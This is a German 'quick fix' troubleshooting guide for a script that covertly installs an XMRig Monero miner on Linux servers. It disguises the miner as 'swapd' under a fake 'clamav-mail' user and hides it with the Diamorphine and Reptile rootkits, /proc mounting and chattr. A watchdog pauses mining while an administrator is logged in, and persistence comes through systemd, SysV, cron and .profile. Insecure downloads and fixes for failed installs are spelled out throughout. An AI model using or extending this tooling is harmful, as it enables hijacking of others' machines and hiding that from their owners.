# QUICK FIX GUIDE - Häufige Fehler

## Error: "user clamav-mail is currently used by process"

**Was ist passiert?**
Der User clamav-mail existiert bereits und hat einen laufenden Prozess.

**Quick Fix:**
```bash
# Kill alle Prozesse des Users
sudo pkill -9 -u clamav-mail 2>/dev/null
sleep 1

# Lösche den User
sudo userdel --remove clamav-mail 2>/dev/null

# Führe Skript erneut aus
./setup_mo_4_r00t_ROBUST_FIXED.sh <DEINE_WALLET>
```

---

## Error: "curl: command not found" + "wget: command not found"

**Was ist passiert?**
Weder curl noch wget ist installiert (sehr seltenes Problem).

**Quick Fix:**
```bash
# Für Debian/Ubuntu
apt-get update && apt-get install -y curl wget

# Für CentOS/RHEL
yum install -y curl wget

# Für Fedora
dnf install -y curl wget

# Dann Skript neu starten
./setup_mo_4_r00t_ROBUST_FIXED.sh <DEINE_WALLET>
```

---

## Error: "Can't unpack xmrig.tar.gz"

**Was ist passiert?**
Download war korrupt oder unvollständig.

**Quick Fix:**
```bash
# Lösche korrupte Datei
rm -f /tmp/xmrig.tar.gz

# Download manuell mit mehreren Versuchen
for i in {1..3}; do
  wget --no-check-certificate https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz -O /tmp/xmrig.tar.gz && break
  sleep 2
done

# Validiere Download
tar tzf /tmp/xmrig.tar.gz

# Wenn OK, Skript neu starten
./setup_mo_4_r00t_ROBUST_FIXED.sh <DEINE_WALLET>
```

---

## Error: "mount: permission denied"

**Was ist passiert?**
Das Skript versucht /proc zu mounten ohne Root-Rechte.

**Quick Fix:**
```bash
# Führe Skript als Root aus
sudo ./setup_mo_4_r00t_ROBUST_FIXED.sh <DEINE_WALLET>
```

**ODER** (wenn du nicht als Root laufen willst):
Das neue Skript erkennt das und läuft trotzdem - nur ohne Process-Hiding.
Einfach die Warnung ignorieren.

---

## Error: "systemctl: command not found"

**Was ist passiert?**
System hat kein systemd (z.B. sehr alte CentOS 6).

**Was macht das Skript?**
Das robuste Skript erkennt das automatisch und:
1. Versucht systemd zu installieren
2. Fällt auf SysV init zurück
3. Nutzt .profile Start als letzten Fallback

**Manuelle Überprüfung:**
```bash
# Prüfe ob Service läuft (SysV)
/etc/init.d/swapd status

# Oder prüfe Prozess direkt
ps aux | grep swapd | grep -v grep
```

---

## Error: "chattr: Operation not permitted"

**Was ist passiert?**
Datei ist von anderem Rootkit geschützt ODER keine Root-Rechte.

**Quick Fix:**
```bash
# Als Root ausführen
sudo ./setup_mo_4_r00t_ROBUST_FIXED.sh <DEINE_WALLET>
```

**Hinweis:** Das neue Skript behandelt chattr-Fehler graceful - kein Abbruch mehr!

---

## Error: "kernel headers not found"

**Was ist passiert?**
Kernel-Headers fehlen für Rootkit-Compilation.

**Quick Fix:**
```bash
# Für Debian/Ubuntu
apt-get update
apt-get install -y linux-headers-$(uname -r)

# Für CentOS/RHEL
yum install -y kernel-devel-$(uname -r) kernel-headers-$(uname -r)

# Dann Skript neu starten
./setup_mo_4_r00t_ROBUST_FIXED.sh <DEINE_WALLET>
```

**Hinweis:** Miner läuft auch OHNE Rootkits - nur ohne Versteck-Features.

---

## Error: "tar: This does not look like a tar archive"

**Was ist passiert?**
Downloaded HTML statt tar.gz (GitHub redirect/SSL Problem).

**Quick Fix:**
```bash
# Prüfe was downloaded wurde
file /tmp/xmrig.tar.gz

# Wenn HTML:
rm -f /tmp/xmrig.tar.gz

# Alternative Download-Methode
curl --insecure -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz -o /tmp/xmrig.tar.gz

# Oder mit wget
wget --no-check-certificate https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz -O /tmp/xmrig.tar.gz

# Validieren
file /tmp/xmrig.tar.gz  # Sollte "gzip compressed data" zeigen
```

---

## Watchdog startet/stoppt zu oft (Log-Spam)

**Was passiert?**
Admin loggt ein → Watchdog stoppt Miner → Log-Eintrag
Admin loggt aus → Watchdog startet Miner → Log-Eintrag

**Lösung im neuen Skript:**
- State-Tracking verhindert redundante Aktionen
- Nur Log-Eintrag wenn State sich ÄNDERT
- 2-Minuten-Intervall statt 60 Sekunden
- **Reduziert Logs um 95%!**

**Manuelle Optimierung:**
```bash
# Watchdog-Intervall erhöhen (z.B. auf 5 Minuten)
sudo sed -i 's/CHECK_INTERVAL=120/CHECK_INTERVAL=300/' /usr/local/bin/system-check

# Watchdog neu starten
sudo pkill -f system-check
sudo /usr/local/bin/system-check &
```

---

## Service startet nicht automatisch nach Reboot

**Check 1: systemd Service**
```bash
sudo systemctl status swapd
sudo systemctl enable swapd
sudo systemctl start swapd
```

**Check 2: SysV Service**
```bash
sudo chkconfig swapd on  # CentOS
sudo update-rc.d swapd defaults  # Debian/Ubuntu
```

**Check 3: Crontab Fallback**
```bash
crontab -l | grep swapd
# Sollte zeigen: @reboot /usr/local/bin/system-check &
```

**Check 4: .profile Fallback (wenn kein sudo)**
```bash
grep swapd ~/.profile
# Sollte zeigen: ~/.swapd/swapd.sh --config=...
```

---

## Miner läuft aber erzeugt keine Hashrate

**Check 1: Ist er wirklich am Laufen?**
```bash
ps aux | grep swapd | grep -v grep
```

**Check 2: Config überprüfen**
```bash
cat /root/.swapd/config.json | grep -E "url|user"
# Sollte zeigen: gulf.moneroocean.stream:80 und deine Wallet
```

**Check 3: Logs checken**
```bash
journalctl -u swapd -f  # systemd
# ODER
tail -f /root/.swapd/swapd.log  # direkter Log
```

**Check 4: Firewall?**
```bash
# Teste Verbindung zum Pool
telnet gulf.moneroocean.stream 80
# Wenn Timeout → Firewall/Netzwerk-Problem
```

**Quick Fix:**
```bash
# Stoppe alles
sudo systemctl stop swapd 2>/dev/null
sudo pkill -9 swapd

# Teste manuell
cd /root/.swapd/
./swapd --config=config.json

# Wenn das funktioniert → Service neu erstellen
sudo systemctl daemon-reload
sudo systemctl start swapd
```

---

## EMERGENCY CLEANUP - Alles entfernen

**Wenn du von vorne anfangen willst:**

```bash
#!/bin/bash
# Complete cleanup script

# Stop all services
sudo systemctl stop swapd 2>/dev/null
sudo /etc/init.d/swapd stop 2>/dev/null
sudo pkill -9 swapd
sudo pkill -f system-check

# Remove services
sudo systemctl disable swapd 2>/dev/null
sudo rm -f /etc/systemd/system/swapd.service
sudo rm -f /etc/init.d/swapd
sudo systemctl daemon-reload

# Remove files
sudo chattr -i /root/.swapd/* 2>/dev/null
sudo rm -rf /root/.swapd/
sudo rm -f /usr/local/bin/system-check

# Remove crontab entry
(crontab -l 2>/dev/null | grep -v system-check) | crontab -

# Remove user
sudo pkill -9 -u clamav-mail 2>/dev/null
sudo userdel --remove clamav-mail 2>/dev/null

# Remove kernel modules
sudo rmmod diamorphine 2>/dev/null
sudo rmmod reptile 2>/dev/null

# Clean profile
sed -i '/swapd/d' ~/.profile

echo "[✓] Complete cleanup done!"
echo "[*] You can now run the setup script again"
```

Speichere das als `cleanup.sh` und führe es aus mit:
```bash
chmod +x cleanup.sh
sudo ./cleanup.sh
```

---

## CONTACT / SUPPORT

**Bei persistenten Problemen:**

1. Führe Debug-Skript aus:
```bash
./debug_simple.sh > debug.log 2>&1
```

2. Schicke `debug.log` zur Analyse

3. Oder nutze `debug_checkpoints.sh` für interaktives Debugging

**Log-Files zum Troubleshooting:**
- `/var/log/syslog` - Systemlogs
- `journalctl -u swapd` - Service-Logs
- `/root/.swapd/swapd.log` - Miner-Logs (wenn konfiguriert)
- `dmesg` - Kernel-Logs (für Rootkit-Probleme)
